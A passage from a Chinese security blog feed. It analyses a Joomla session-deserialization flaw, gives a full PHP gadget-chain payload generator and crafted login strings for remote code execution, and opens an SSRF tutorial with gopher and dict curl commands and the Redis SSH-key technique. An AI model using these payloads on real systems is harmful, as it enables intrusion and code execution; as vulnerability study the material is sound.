data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028001846145-1227489260.png\" alt=\"img\"></p>\n<p>在登录过程中，会有一个 303 的跳转，这个跳转是先把用户的输入经过序列化存储在 session 表中，读取的时候再从 session 表中取出数据进行反序列化，进行账号密码对比</p>\n<p>通过序列化写入 session 表的具体代码如下：</p>\n<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; write()</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028225321914-653179029.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225321914-653179029.png\" alt=\"img\"></a></p>\n<p>因为 protected 修饰的变量在序列化后会变成这种形式：\\x00 + * + \\x00 + [变量名]，而 mysql 无法保存 NULL 字节的数据，所以在代码中可以看到在写入 session 表的过程中会将 \\x00*\\x00 替换为 \\0\\0\\0 来进行存储，就比如 Registry 类下 protected 修饰的 $data 变量，序列化存储为：</p>\n<p><a href=\"https://img2020.cnblogs.com/blog/1344396/202010/1344396-20201028231208408-1317263109.png\"><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028231208408-1317263109.png\" alt=\"img\"></a></p>\n<p>通过反序列化读取 session 表的具体代码如下：</p>\n<p>Joomla/libraries/joomla/session/storage/database.php ——&gt; read()</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201028225519116-1363963610.png\" alt=\"img\"></p>\n<p>在读取时会重新把 \\0\\0\\0 替换为 \\x00*\\x00 来进行反序列化。</p>\n<p>因此反序列化存入 session 表中的数据比原始数据要多 3 个字节</p>\n<p>如果传入的用户名为 \\0\\0\\0admin，序列化写入 session 表中的数据为：</p>\n<p>在调用 read 方法进行读取时会先将 \\0\\0\\0 转换为 N*N（\\x00 为空字节为方便展示这里使用 N 代替）：</p>\n<p>\\0\\0\\0admin</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:&quot;username&quot;;s:11:&quot;N*Nadmin&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;</span><br></pre></td></tr></table></figure>\n<p>因为 read 之后长度变短了 3 个字节，在反序列化的时候 username 的值为 s:11:“N<em>Nadmin&quot;，但是实际只有 8 个字节，为了满足反序列化的规则，就会吃掉后面 3 个字节的数据，直至凑齐 11 个字符，也就是 s:11:&quot;N</em>Nadmin”;s。</p>\n<p>利用这个思路，足够多的 \\0\\0\\0 就可以将 password 字段的数据逃逸出来，构造如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</span><br></pre></td></tr></table></figure>\n<p>read () 之后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345</span><br></pre></td></tr></table></figure>\n<p>username 的值为 N<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN<em>NN</em>NN*N&quot;;s:8:“password”;s:6:&quot;12345，后面补上 &quot; 和；就成功逃逸出来了</p>\n<p>实现对象注入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s:8:s:&quot;username&quot;;s:54:&quot;N*NN*NN*NN*NN*NN*NN*NN*NN*N&quot;;s:8:&quot;password&quot;;s:6:&quot;12345&quot;;s:2:&quot;HS&quot;:O:15:&quot;ObjectInjection&quot;</span><br></pre></td></tr></table></figure>\n<p>这里来分析一下利用链，通过搜索 eval/assert/call_user_func… 这类可以利用并且参数可控的危险函数，可以找到用于构造执行链的类：</p>\n<p>这几个文件调取 call_user_func 的方式都相同，来看一下 libraries\\joomla\\database\\driver\\mysqli.php 中方法的具体实现</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221114210130490.png\" alt=\"image-20221114210130490\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031162618304-261047353.png\" alt=\"img\"></p>\n<p>当 JDatabaseDriverMysqli 这个类的对象被调用，在结束时都会调用析构函数__destruct，__destruct 中会调用 disconnect () 方法。</p>\n<p>而当<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>c</mi><mi>o</mi><mi>n</mi><mi>n</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mtext>为</mtext><mi>t</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>的时候，就会调用</mtext><mi>c</mi><mi>a</mi><mi>l</mi><msub><mi>l</mi><mi>u</mi></msub><mi>s</mi><mi>e</mi><msub><mi>r</mi><mi>f</mi></msub><mi>u</mi><mi>n</mi><msub><mi>c</mi><mi>a</mi></msub><mi>r</mi><mi>r</mi><mi>a</mi><mi>y</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">this-&gt;connection为true的时候，就会调用call_user_func_array(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.036108em;vertical-align:-0.286108em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">n</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">n</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">时</span><span class=\"mord cjk_fallback\">候</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">就</span><span class=\"mord cjk_fallback\">会</span><span class=\"mord cjk_fallback\">调</span><span class=\"mord cjk_fallback\">用</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.01968em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">s</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3361079999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.10764em;\">f</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">n</span><span class=\"mord\"><span class=\"mord mathnormal\">c</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">a</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.03588em;\">y</span><span class=\"mopen\">(</span></span></span></span>h, array(&amp;this)); 方法对disconnectHandlers数组中的每个值，都会执行call_user_func_array()，并将&this 作为参数引用，但是不能控制参数，所以不能直接构造 assert+eval 来执行任意代码。</p>\n<p>继续往下看发现在 libraries\\simplepie\\simplepie.php 中有一处 call_user_func 方法调用</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031171046685-27582232.png\" alt=\"img\"></p>\n<p>这个 call_user_func ($this-&gt;cache_name_function, <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>f</mi><mi>e</mi><mi>e</mi><msub><mi>d</mi><mi>u</mi></msub><mi>r</mi><mi>l</mi><mo stretchy=\"false\">)</mo><mtext>两个参数都是可控的，于是只要满足</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt;feed_url)两个参数都是可控的，于是只要满足</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">e</span><span class=\"mord\"><span class=\"mord mathnormal\">d</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">u</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">两</span><span class=\"mord cjk_fallback\">个</span><span class=\"mord cjk_fallback\">参</span><span class=\"mord cjk_fallback\">数</span><span class=\"mord cjk_fallback\">都</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">可</span><span class=\"mord cjk_fallback\">控</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">于</span><span class=\"mord cjk_fallback\">是</span><span class=\"mord cjk_fallback\">只</span><span class=\"mord cjk_fallback\">要</span><span class=\"mord cjk_fallback\">满</span><span class=\"mord cjk_fallback\">足</span></span></span></span> this-&gt;cache 为 True，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>r</mi><mi>a</mi><msub><mi>w</mi><mi>d</mi></msub><mi>a</mi><mi>t</mi><mi>a</mi><mtext>为</mtext><mi>T</mi><mi>r</mi><mi>u</mi><mi>e</mi><mtext>，</mtext></mrow><annotation encoding=\"application/x-tex\">this-&gt;raw_data为True，</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.77777em;vertical-align:-0.08333em;\"></span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">h</span><span class=\"mord mathnormal\">i</span><span class=\"mord mathnormal\">s</span><span class=\"mord\">−</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">a</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.02691em;\">w</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.33610799999999996em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">d</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\">t</span><span class=\"mord mathnormal\">a</span><span class=\"mord cjk_fallback\">为</span><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">T</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\">e</span><span class=\"mord cjk_fallback\">，</span></span></span></span>parsed_feed_url [‘scheme’] 不为空就能够 RCE 了，并且 $parsed_feed_url [‘scheme’] 可以能够利用 || $a=‘http//’; 绕过 scheme 的解析</p>\n<p>不过这个 call_user_func 属于 init () 方法，并不属于魔术方法，所以需要结合前面 JDatabaseDriverMysqli 类下的 disconnect () 中的 call_user_func_array 方法实现对 init () 方法的回调。就相当于：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$this-&gt;disconnectHandlers = array(&quot;test&quot;=&gt;array(new SimplePie(),&quot;init&quot;));</span><br></pre></td></tr></table></figure>\n<p>这样的话就相当于实例化了一个 SimplePie 类的对象，并且调用 SimplePie 类下的 init () 方法。</p>\n<p>这里还有一个问题，虽然实例化了一个 SimplePie 的类，但是 SimplePie 类不会自动加载。需要去引入加载类。</p>\n<p>/libraries/legacy/simplepie/factory.php</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031184225965-1491276190.png\" alt=\"img\"></p>\n<p>发现刚开始就导入了 SimplePie 类，并且 JSimplepieFactory 类属于 autoload，会自动加载，这样的话只需要引入这个类就可以成功加载 SimplePie。</p>\n<p>payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">class JSimplepieFactory&#123;&#125;</span><br><span class=\"line\">class JDatabaseDriverMysql&#123;&#125;</span><br><span class=\"line\">class JDatabaseDriverMysqli</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    protected $abc;</span><br><span class=\"line\">    protected $connection;</span><br><span class=\"line\">    protected $disconnectHandlers;</span><br><span class=\"line\">    function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;abc = new JSimplepieFactory();</span><br><span class=\"line\">        $this-&gt;connection = 1;</span><br><span class=\"line\">        $this-&gt;disconnectHandlers = [</span><br><span class=\"line\">            [new SimplePie, &quot;init&quot;],</span><br><span class=\"line\">        ];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class SimplePie</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    var $sanitize;</span><br><span class=\"line\">    var $cache_name_function;</span><br><span class=\"line\">    var $feed_url;</span><br><span class=\"line\">    function __construct()</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;</span><br><span class=\"line\">        $this-&gt;cache_name_function = &quot;assert&quot;;</span><br><span class=\"line\">        $this-&gt;sanitize = new JDatabaseDriverMysql();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$obj = new JDatabaseDriverMysqli();</span><br><span class=\"line\">$ser = serialize($obj);</span><br><span class=\"line\">echo str_replace(chr(0) . &#x27;*&#x27; . chr(0), &#x27;\\0\\0\\0&#x27;, $ser);?&gt;</span><br></pre></td></tr></table></figure>\n<p>最后构造的账号密码为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">username：\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0</span><br><span class=\"line\">password：123&quot;;s:4:&quot;test&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:6:&quot;\\0\\0\\0abc&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:13:&quot;\\0\\0\\0connection&quot;;i:1;s:21:&quot;\\0\\0\\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:3:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n<p>登录时需要登录两次，第一次将他序列化存储进 session 中，第二次将 session 中的值反序列化和我们的输入进行比对，在第二次 rce 产生</p>\n<blockquote>\n<p>最后总结一下：</p>\n<p>1.Joomla 中会把登录的用户名和密码序列化存储进入 session，并且放入数据库中。</p>\n<p>2. 由于 username 和 password 是 protected，因此会有 <code>*N*</code>  的修饰，但数据库中不能存储 <code>N*N</code> （N 为 ASCII 为 0 的字符），因此在序列化入 session 中会将 <code>N*N</code>  替换为 <code>\\0\\0\\0</code> ，在下次和我们输入的用户名密码判断时反序列化，将其变为合规的序列化字符串</p>\n<p>3. 漏洞的关键点在于从 <code>\\0\\0\\0</code>  变为 <code>N*N</code>  时字符变少了三个，我们可以利用变少的三个做变量逃逸，从而覆盖 password</p>\n<p>4. 因此我们的输入用户名时可以自己构造 <code>\\0</code> ，比如我们构造如下用户 <code>\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0</code> ，这样反序列化后多出了 27 个字符把后面的 password 全部吃掉了 <code>s:8:s:&quot;username&quot;;s:54:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;</code> ，password 被吃掉后我们就可以构造我们自己的 password，里面的内容为恶意代码，我们接下来要干的事情就是把我们序列化过的恶意代码放入因为逃逸而变为可控变量的 password 中</p>\n<p>5. 然后我们需要找危险函数，来调用，我们在 <code>libraries\\joomla\\database\\driver\\mysqli.php</code>  中找到了 <code>disconnect()</code>  函数，其中调用了 <code>call_user_func_array</code> ，而 mysqli 类中的 <code>__destruct()</code>  会自动调用 <code>disconnect ()</code></p>\n<p>6. 但是 <code>disconnect()</code>  函数中的 <code>call_user_func_array</code>  中的参数我们只能控制第一个参数 <code>$h</code> ，不能直接构造恶意代码</p>\n<p>7. 我们在 <code>libraries\\simplepie\\simplepie.php</code>  中有一个 <code>init()</code>  函数，其中还可以找到一个危险函数 <code>call_user_func</code>  方法调用，并且好消息是他的两个参数 <code>cache_name_function</code>  和 <code>feed_url</code>  我们都可以控制</p>\n<p>8. 但是 <code>init()</code>  不是魔法方法，不会自动调用，我们需要使用一些奇技淫巧调用。即使用刚刚的 <code>disconnect()</code>  函数自动调用 <code>init()</code></p>\n<p>9. 接下来的问题就是我们如何用 <code>disconnect()</code>  中的一个可控参数完成对 <code>init()</code>  的调用。我们使用 <code>call_user_func_array(array(new SimplePie(),&quot;init&quot;))</code>  这样的形式来调用，array 中第一个是我们的类名，第二个是类函数名，而我们不需要 ``call_user_func_array ()` 中的第二个变量</p>\n<p>10. 最后一个问题是 <code>libraries\\simplepie\\simplepie.php</code>  和 <code>libraries\\joomla\\database\\driver\\mysqli.php</code>  是两个不同的 <code>php</code>  文件，如果没有 <code>include()</code>  这类函数的情况下是无法使用隔壁 php 的类的。我们的解决方案是找到一个新的文件 <code>/libraries/legacy/simplepie/factory.php</code> ，其中 <code>jimport(simplepie.simplepie)</code> ，同时 <code>factory.php</code>  中的 <code>JSimplepieFactory</code>  是自动 <code>autoload</code> ，这样我们就能加载 <code>simplepie</code>  类</p>\n<p>11. 由于 <code>session</code>  的存在，我们需要抓包，连续放包两次，第一次将 <code>session</code>  写入数据库中，第二次将我们的输入和数据库中反序列化的 <code>session</code>  比对，一旦反序列化，我们上面构造的恶意 <code>payload</code>  触发，实现 <code>rce</code></p>\n</blockquote>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/06/27/SSRF/",
            "url": "http://example.com/2022/06/27/SSRF/",
            "title": "SSRF",
            "date_published": "2022-06-27T05:38:45.000Z",
            "content_html": "<h2 id=\"ssrf\"><a class=\"markdownIt-Anchor\" href=\"#ssrf\">#</a> SSRF</h2>\n<h3 id=\"前置知识\"><a class=\"markdownIt-Anchor\" href=\"#前置知识\">#</a> 前置知识</h3>\n<h4 id=\"1dict协议\"><a class=\"markdownIt-Anchor\" href=\"#1dict协议\">#</a> 1.dict 协议</h4>\n<blockquote>\n<p>dict 协议是一个在线网络字典协议，这个协议是用来架设一个字典服务的。可以看到用这个协议架设的服务可以用 telnet 来登陆，说明这个协议应该是基于 tcp 协议开发的。</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">telnet dict.org 2628</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220325164738004.png\" alt=\"image-20220325164738004\"></p>\n<p>我们输入  <code>define [字典名] [单词]</code>  这样的命令来获取一个单词的解释</p>\n<p>比如说  <code>define english hello</code></p>\n<p>服务器就会返回对应的单词解释</p>\n<p>对弈一些 <code>tcp</code>  协议，用 <code>dict</code>  方法可以打开，在有 <code>waf</code>  的情况下可以获取一些开放的服务信息</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">// 文件名: main.php</span><br><span class=\"line\">  </span><br><span class=\"line\">$url = &quot;dict://localhost:3306&quot;; // localhost:3306 上架设了我的 mysql 服务</span><br><span class=\"line\"></span><br><span class=\"line\">$ch = curl_init($url);</span><br><span class=\"line\">curl_exec($ch);</span><br><span class=\"line\">curl_close($ch);</span><br><span class=\"line\"></span><br><span class=\"line\">N 5.5.62-log=gnsw|+\\��!�n5[KF\\&#123;wdo&quot;Umysql_native_password!��#08S01Got packets out of order1</span><br></pre></td></tr></table></figure>\n<p>配合 burpsuite 可以进行端口扫描</p>\n<h4 id=\"gopher协议\"><a class=\"markdownIt-Anchor\" href=\"#gopher协议\">#</a> gopher 协议</h4>\n<p><code>gopher</code>  协议是一种信息查找系统，他将 <code>Internet</code>  上的文件组织成某种索引，方便用户从 <code>Internet</code>  的一处带到另一处。在 <code>WWW</code>  出现之前， <code>Gopher</code>  是 <code>Internet</code>  上最主要的信息检索工具，Gopher 站点也是最主要的站点，使用 <code>tcp70</code>  端口。但在 <code>WWW</code>  出现后， <code>Gopher</code>  失去了昔日的辉煌。现在它基本过时，人们很少再使用它。</p>\n<p><code>gopher</code>  协议格式: <code>gopher://IP:port/_&#123;TCP/IP数据流&#125;</code></p>\n<p>gopher 可以接收 get 和 post 请求</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl gopher://192.168.109.166:80/_GET%20/get.php%3fparam=Konmu%20HTTP/1.1%0d%0aHost:192.168.109.166%0d%0a</span><br><span class=\"line\">curl gopher://192.168.194.1:80/_POST%20/post.php%20HTTP/1.1%0d%0AHost:192.168.194.1%0d%0AContent-Type:application/x-www-form-urlencoded%0d%0AContent-Length:12%0d%0A%0d%0Aname=purplet%0d%0A</span><br></pre></td></tr></table></figure>\n<p>ssrf + gopher 可以实现 Redis 未授权访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST与GET传参的区别：它有4个参数为必要参数</span><br><span class=\"line\"></span><br><span class=\"line\">POST /post.php HTTP/1.1</span><br><span class=\"line\">host:192.168.194.1</span><br><span class=\"line\">Content-Type:application/x-www-form-urlencoded</span><br><span class=\"line\">Content-Length:12name=purplet</span><br></pre></td></tr></table></figure>\n<h3 id=\"ssrf-redis-未授权访问\"><a class=\"markdownIt-Anchor\" href=\"#ssrf-redis-未授权访问\">#</a> ssrf + Redis 未授权访问</h3>\n<p>攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的 config 命令，可以进行写文件操作</p>\n<p>攻击者可以成功将自己的 ssh 公钥写入目标服务器的 /root/.ssh 文件夹的 authotrized_keys 文件中，进而可以使用对应私钥直接使用 ssh 服务登录目标服务器。</p>\n<p>简单说，漏洞的产生条件有以下两点:</p>\n<p>（1）redis 绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源 ip 访问等相关安全策略，直接暴露在公网；<br>\n（2）没有设置密码认证（一般为空），可以免密码远程登录 redis 服务。</p>\n<p>1. 启动 redis</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">可以指定配置文件启动(若不指定则以默认的配置文件启动)：</span><br><span class=\"line\">./redis-server /etc/redis/redis.conf</span><br></pre></td></tr></table></figure>\n<p>安全模式起作用需要同时满足俩个条件：</p>\n<p>(1) redis 没有开启登录认证</p>\n<p>(2) redis 没有绑定到某个 ip 地址或 ip 段</p>\n<p>redis 默认是未开启登录认证，开启安全模式的.</p>\n<p>造成未授权访问有两种情况：</p>\n<ol>\n<li>未开启登录验证，并且把 IP 绑定到 